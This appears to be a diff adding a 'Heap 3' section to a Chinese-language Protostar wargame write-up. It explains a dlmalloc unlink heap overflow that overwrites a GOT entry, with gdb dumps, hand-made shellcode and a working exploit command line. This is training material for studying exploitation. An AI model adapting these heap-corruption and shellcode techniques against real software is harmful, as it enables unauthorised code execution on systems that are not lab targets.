@@ -678,3 +678,182 @@ service AAAAAAAAAAAAAAAAAAAAAAA
 login
 you have logged in already!
 ```
+
+## Heap 3
+
+> the Doug Lea Malloc (dlmalloc)
+
+```c
+#include <stdlib.h>
+#include <unistd.h>
+#include <string.h>
+#include <sys/types.h>
+#include <stdio.h>
+
+void winner()
+{
+  printf("that wasn't too bad now, was it? @ %d\n", time(NULL));
+}
+
+int main(int argc, char **argv)
+{
+  char *a, *b, *c;
+
+  a = malloc(32);
+  b = malloc(32);
+  c = malloc(32);
+
+  strcpy(a, argv[1]); // can't deal with null bytes
+  strcpy(b, argv[2]);
+  strcpy(c, argv[3]);
+
+  free(c);
+  free(b);
+  free(a);
+
+  printf("dynamite failed?\n");
+}
+```
+
+- 通过 [`malloc`](../static/malloc.c) 的 `unlink` 修改 `GOT` 表条目，`FD->bk` 对应目标 `GOT` 表条目地址，`BK` 指向 shellcode 的起始地址
+    - 注意有 `BK->fd` 写回
+
+    ```c
+    #define unlink(P, BK, FD) {
+      FD = P->fd;              
+      BK = P->bk;              
+      FD->bk = BK;             
+      BK->fd = FD;             
+    }
+    ```
+
+- Overflow `b` 修改 `c` 对应 chunk 的大小使其大于 `MAX_FAST_SIZE 80`，Overflow `c` 来构造 fake chunk 控制 `unlink`，用于调用函数 `winner` 的 shellcode 可放于 `a` 中
+    - fake chunk 的 `prev_inuse` 位需设置为 0
+    - 注意 `free` 会修改 chunk 的 forward pointer，即 data 域的首 $4$ 字节
+
+        |prev_size|size|<span style="color: red">fd</span>|bk|
+        -|-|-|-
+
+- fake chunk 的 next chunk 的 `prev_inuse` 位同样应为 0，从而能调用 `unlink`
+
+    ```c
+    nextinuse = inuse_bit_at_offset(nextchunk, nextsize);
+
+    if (!nextinuse) {
+      unlink(nextchunk, bck, fwd);
+      size += nextsize;
+    } else
+    clear_inuse_bit_at_offset(nextchunk, 0);
+    ```
+
+- next chunk 的起始地址根据当前 chunk 的起始地址和 size 进行计算，可以设置 size 为 `0xfffffffc`，实际计算等同于 -4，避免了 null 字节也无需再构造一个 chunk
+- 查看相关地址信息
+
+    ??? note "Dump of assembler code for function main"
+
+        ```bash
+        (gdb) set disassembly-flavor intel
+        (gdb) disassemble main
+        Dump of assembler code for function main:
+        0x08048889 <main+0>:	push   ebp
+        0x0804888a <main+1>:	mov    ebp,esp
+        0x0804888c <main+3>:	and    esp,0xfffffff0
+        0x0804888f <main+6>:	sub    esp,0x20
+        0x08048892 <main+9>:	mov    DWORD PTR [esp],0x20
+        0x08048899 <main+16>:	call   0x8048ff2 <malloc>
+        0x0804889e <main+21>:	mov    DWORD PTR [esp+0x14],eax
+        0x080488a2 <main+25>:	mov    DWORD PTR [esp],0x20
+        0x080488a9 <main+32>:	call   0x8048ff2 <malloc>
+        0x080488ae <main+37>:	mov    DWORD PTR [esp+0x18],eax
+        0x080488b2 <main+41>:	mov    DWORD PTR [esp],0x20
+        0x080488b9 <main+48>:	call   0x8048ff2 <malloc>
+        0x080488be <main+53>:	mov    DWORD PTR [esp+0x1c],eax
+        0x080488c2 <main+57>:	mov    eax,DWORD PTR [ebp+0xc]
+        0x080488c5 <main+60>:	add    eax,0x4
+        0x080488c8 <main+63>:	mov    eax,DWORD PTR [eax]
+        0x080488ca <main+65>:	mov    DWORD PTR [esp+0x4],eax
+        0x080488ce <main+69>:	mov    eax,DWORD PTR [esp+0x14]
+        0x080488d2 <main+73>:	mov    DWORD PTR [esp],eax
+        0x080488d5 <main+76>:	call   0x8048750 <strcpy@plt>
+        0x080488da <main+81>:	mov    eax,DWORD PTR [ebp+0xc]
+        0x080488dd <main+84>:	add    eax,0x8
+        0x080488e0 <main+87>:	mov    eax,DWORD PTR [eax]
+        0x080488e2 <main+89>:	mov    DWORD PTR [esp+0x4],eax
+        0x080488e6 <main+93>:	mov    eax,DWORD PTR [esp+0x18]
+        0x080488ea <main+97>:	mov    DWORD PTR [esp],eax
+        0x080488ed <main+100>:	call   0x8048750 <strcpy@plt>
+        0x080488f2 <main+105>:	mov    eax,DWORD PTR [ebp+0xc]
+        0x080488f5 <main+108>:	add    eax,0xc
+        0x080488f8 <main+111>:	mov    eax,DWORD PTR [eax]
+        0x080488fa <main+113>:	mov    DWORD PTR [esp+0x4],eax
+        0x080488fe <main+117>:	mov    eax,DWORD PTR [esp+0x1c]
+        0x08048902 <main+121>:	mov    DWORD PTR [esp],eax
+        0x08048905 <main+124>:	call   0x8048750 <strcpy@plt>
+        0x0804890a <main+129>:	mov    eax,DWORD PTR [esp+0x1c]
+        0x0804890e <main+133>:	mov    DWORD PTR [esp],eax
+        0x08048911 <main+136>:	call   0x8049824 <free>
+        0x08048916 <main+141>:	mov    eax,DWORD PTR [esp+0x18]
+        0x0804891a <main+145>:	mov    DWORD PTR [esp],eax
+        0x0804891d <main+148>:	call   0x8049824 <free>
+        0x08048922 <main+153>:	mov    eax,DWORD PTR [esp+0x14]
+        0x08048926 <main+157>:	mov    DWORD PTR [esp],eax
+        0x08048929 <main+160>:	call   0x8049824 <free>
+        0x0804892e <main+165>:	mov    DWORD PTR [esp],0x804ac27
+        0x08048935 <main+172>:	call   0x8048790 <puts@plt>
+        0x0804893a <main+177>:	leave  
+        0x0804893b <main+178>:	ret    
+        End of assembler dump.
+        ```
+
+    ```bash
+    (gdb) x winner 
+    0x8048864 <winner>:	0x83e58955
+    (gdb) disassemble 0x8048790
+    Dump of assembler code for function puts@plt:
+    0x08048790 <puts@plt+0>:	jmp    DWORD PTR ds:0x804b128
+    0x08048796 <puts@plt+6>:	push   0x68
+    0x0804879b <puts@plt+11>:	jmp    0x80486b0
+    End of assembler dump.
+    (gdb) x 0x804b128
+    0x804b128 <_GLOBAL_OFFSET_TABLE_+64>:	0x08048796
+    (gdb) info proc map
+    process 17219
+    cmdline = '/opt/protostar/bin/heap3'
+    cwd = '/opt/protostar/bin'
+    exe = '/opt/protostar/bin/heap3'
+    Mapped address spaces:
+
+      Start Addr   End Addr       Size     Offset objfile
+      0x8048000  0x804b000     0x3000          0        /opt/protostar/bin/heap3
+      0x804b000  0x804c000     0x1000     0x3000        /opt/protostar/bin/heap3
+      0x804c000  0x804d000     0x1000          0           [heap]
+      0xb7e96000 0xb7e97000     0x1000          0        
+      0xb7e97000 0xb7fd5000   0x13e000          0         /lib/libc-2.11.2.so
+      0xb7fd5000 0xb7fd6000     0x1000   0x13e000         /lib/libc-2.11.2.so
+      0xb7fd6000 0xb7fd8000     0x2000   0x13e000         /lib/libc-2.11.2.so
+      0xb7fd8000 0xb7fd9000     0x1000   0x140000         /lib/libc-2.11.2.so
+      0xb7fd9000 0xb7fdc000     0x3000          0        
+      0xb7fe0000 0xb7fe2000     0x2000          0        
+      0xb7fe2000 0xb7fe3000     0x1000          0           [vdso]
+      0xb7fe3000 0xb7ffe000    0x1b000          0         /lib/ld-2.11.2.so
+      0xb7ffe000 0xb7fff000     0x1000    0x1a000         /lib/ld-2.11.2.so
+      0xb7fff000 0xb8000000     0x1000    0x1b000         /lib/ld-2.11.2.so
+      0xbffeb000 0xc0000000    0x15000          0           [stack]
+    ```
+
+- 通过 [Online x86 / x64 Assembler and Disassembler](https://defuse.ca/online-x86-assembler.htm) 将调用函数 `winner` 的汇编转换为 shellcode
+
+    ```bash
+    # move the address of winner() into eax and call
+    mov eax, 0x8048864
+    call eax
+    # \xB8\x64\x88\x04\x08\xFF\xD0
+    ```
+
+### Exploit
+
+```bash
+$ ./heap3 `echo -ne "AAAA\xB8\x64\x88\x04\x08\xFF\xD0"` `python -c "print('B' * 36 + '\x65')"` `python -c "print('C' * 92 + '\xfc\xff\xff\xff' * 2 + '\x1c\xb1\x04\x08\x0c\xc0\x04\x08')"`
+that wasn't too bad now, was it? @ 1662354454
+Segmentation fault
+```
